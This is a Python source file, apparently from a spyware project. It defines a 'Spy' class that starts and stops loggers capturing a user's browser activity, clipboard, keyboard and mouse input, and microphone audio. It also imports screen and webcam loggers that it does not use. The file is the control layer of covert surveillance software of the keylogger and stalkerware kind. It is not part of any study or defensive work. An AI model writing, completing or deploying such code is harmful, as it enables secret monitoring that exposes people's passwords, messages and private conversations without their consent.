from core.loggers.browser_logger import BrowserLogger
from core.loggers.clipboard_logger import ClipboardLogger
from core.loggers.input_logger import InputLogger
from core.loggers.microphone_logger import MicrophoneLogger
from core.loggers.screen_logger import ScreenLogger
from core.loggers.webcam_logger import WebcamLogger

from config.config_loader import get_section_config
from core.utils.file_utils import create_log_directories
import os
class Spy:

    def __init__(self):
        self.logs = create_log_directories()
        self.loggers = [
            BrowserLogger(),
            ClipboardLogger(),
            InputLogger(),
            MicrophoneLogger()
        ]

    def start(self):
        for logger in self.loggers:
            try:
                logger.start()
            except Exception as e:
                print(f"Error starting {logger.__class__.__name__} logger: {e}")

    def stop(self):
        for logger in self.loggers:
            try:
                logger.stop()
            except Exception as e:
                print(f"Error stopping {logger.__class__.__name__} logger: {e}")
